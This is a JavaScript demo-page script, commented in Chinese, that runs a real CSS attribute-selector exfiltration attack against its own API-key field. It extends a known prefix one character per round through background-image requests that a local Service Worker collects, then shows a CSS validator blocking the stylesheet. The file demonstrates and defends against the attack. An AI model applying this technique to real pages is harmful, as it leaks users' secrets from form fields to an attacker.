"use strict";
/**
 * demo 页逻辑。
 *
 * 诚实性是这个 demo 唯一的价值，所以两条不可动摇：
 *   1. 不模拟。攻击是真的 CSS，请求是浏览器真的发的，"攻击者收到了什么"来自
 *      Service Worker —— 它每收到一个 collect 请求就 postMessage 过来，
 *      "SW 收到了" = "浏览器真的发了"。（被 SW 应答的请求不进 Resource Timing，
 *      所以不能用 timing API 读，只能用 SW 消息。）
 *   2. 规模受控。一次把几百条属性选择器铺到有内容的页面上，Chrome 要为每条做
 *      全文档匹配并触发背景加载，会把渲染进程直接冻住（实测）。真实攻击是分轮的：
 *      任一时刻只探测"已知前缀的下一位"。这里照做 —— 活跃规则数恒定 = 字母表大小，
 *      确认一位就换下一轮。
 */

const $ = (id) => document.getElementById(id);

/** 探测这一个字段。选 API key 是因为它最能让人心里一紧。 */
const TARGET = { selector: 'input#apikey', attr: "value", param: "apikey", out: "out-apikey" };
/** 攻击者关心的字符集。真实攻击会更大；这里够演示，也让每轮规则数可控。 */
const ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789-_.@";
const MAX_LEN = 16;

let session = 0;
let known = "";                 // 已经确认的前缀
let requests = 0;
let styleEl = null;
const logLines = [];

/** 只为"已知前缀 + 每一个可能的下一位"生成规则。总数 = 字母表大小，恒定。 */
function buildRound() {
  if (known.length >= MAX_LEN) return "";
  const rules = [];
  for (const ch of ALPHABET) {
    const prefix = known + ch;
    rules.push(`${TARGET.selector}[${TARGET.attr}^="${prefix}"]{` +
               `background-image:url(collect/?s=${session}&${TARGET.param}=${encodeURIComponent(prefix)})}`);
  }
  return rules.join("\n");
}

function applyRound() {
  if (!styleEl) {
    styleEl = document.createElement("style");
    styleEl.id = "attack";
    document.head.appendChild(styleEl);
  }
  styleEl.textContent = buildRound();
}

function stopAttack() {
  if (styleEl) { styleEl.remove(); styleEl = null; }
}

/** SW 报来一个 collect 请求。这是真相来源。 */
let advanceQueued = false;
function onCollect(query) {
  const params = new URLSearchParams(query);
  if (!params.has(TARGET.param)) return;
  const value = params.get(TARGET.param);
  requests += 1;
  log(`GET collect/?${TARGET.param}=${value}`);
  if (value.length > known.length) {
    known = value;
    // 合并同一帧里的多个进展成一次重铺 —— 一轮里会有多条规则命中（浏览器可能
    // 为同一前缀的不同长度都发一次），逐条重铺会没必要地翻搅样式表。
    if (!advanceQueued) {
      advanceQueued = true;
      requestAnimationFrame(() => { advanceQueued = false; if (styleEl) applyRound(); render(); });
    }
  }
  render();
}

function watchRequests() {
  if (!("serviceWorker" in navigator)) return;
  navigator.serviceWorker.addEventListener("message", (event) => {
    if (event.data && event.data.type === "collect") onCollect(event.data.query);
  });
}

function log(line) {
  logLines.push(line);
  if (logLines.length > 200) logLines.shift();
  const box = $("log");
  box.textContent = logLines.join("\n");
  box.scrollTop = box.scrollHeight;
}

function render() {
  const el = $(TARGET.out);
  el.textContent = known || "—";
  el.classList.toggle("empty", !known);
  // 其余三个字段用静态说明，避免把 demo 复杂化成四路并发（那正是冻结的来源）。
  $("count").textContent = `${requests} requests`;
}

/* ── 那台"页面内攻击者服务器" ─────────────────────────────────────────
   GitHub Pages 是纯静态的，collect/ 会 404 且被负缓存，攻击只能演一次。
   Service Worker 就地扮演攻击者的服务器：应答请求，并把"我收到了"回传给页面。 */
async function ensureCollector() {
  if (!("serviceWorker" in navigator)) return;
  try {
    await navigator.serviceWorker.register("collector-sw.js");
    if (!navigator.serviceWorker.controller) {
      await new Promise((resolve) => {
        navigator.serviceWorker.addEventListener("controllerchange", resolve, { once: true });
        setTimeout(resolve, 2000);
      });
    }
  } catch { /* 注册失败也不拦着，攻击照样真实发生 */ }
}

/* ── 接线 ─────────────────────────────────────────────────────────── */

$("toggle").addEventListener("change", (e) => {
  const on = e.target.checked;
  $("state").textContent = on ? "theme on — watch the API key field" : "theme off";
  if (!on) { stopAttack(); return; }
  session += 1; known = ""; requests = 0; logLines.length = 0;
  log("stylesheet applied…");
  // 目标必须在视口里，否则背景图不加载（懒加载）。立即滚动，滚定后再铺第一轮。
  $("try").scrollIntoView({ block: "center" });
  requestAnimationFrame(applyRound);
});

$("mirror").addEventListener("change", (e) => {
  const input = $("apikey");
  if (e.target.checked) {
    const sync = () => { input.setAttribute("value", input.value); if (styleEl) applyRound(); };
    input.__sync = sync;
    input.addEventListener("input", sync);
    sync();
  } else if (input.__sync) {
    input.removeEventListener("input", input.__sync);
    input.__sync = null;
  }
});

$("check").addEventListener("click", () => {
  const css = buildRound() || `${TARGET.selector}[${TARGET.attr}^="s"]{background-image:url(collect/?x=s)}`;
  const report = window.cssGuard.validateCss(css);
  const box = $("verdict");
  box.hidden = false;
  box.dataset.level = report.ok ? "ok" : "error";
  box.replaceChildren();

  const head = document.createElement("div");
  head.className = "headline";
  const strong = document.createElement("strong");
  strong.textContent = report.ok ? "Clean — nothing here reaches the network"
                                 : `Refused — ${report.errors} error${report.errors === 1 ? "" : "s"}`;
  const p = document.createElement("p");
  p.textContent = report.ok ? "This stylesheet is safe to inject."
                            : "An error is a block, not a warning. Nothing with an error is ever injected.";
  head.append(strong, p);
  box.appendChild(head);

  const seen = new Set();
  for (const f of report.findings) {
    if (seen.has(f.rule)) continue;
    seen.add(f.rule);
    const row = document.createElement("div");
    row.className = "finding";
    row.dataset.sev = f.severity;
    const h = document.createElement("div");
    h.className = "head";
    const sev = document.createElement("span");
    sev.className = "sev";
    sev.textContent = f.severity === "error" ? "blocked" : "warning";
    const msg = document.createElement("span");
    msg.textContent = f.message;
    const rule = document.createElement("span");
    rule.className = "rule";
    rule.textContent = f.rule;
    h.append(sev, msg, rule);
    const why = document.createElement("div");
    why.className = "why";
    why.textContent = f.why;
    row.append(h, why);
    box.appendChild(row);
  }
});

ensureCollector().then(() => { $("toggle").disabled = false; });
watchRequests();
render();
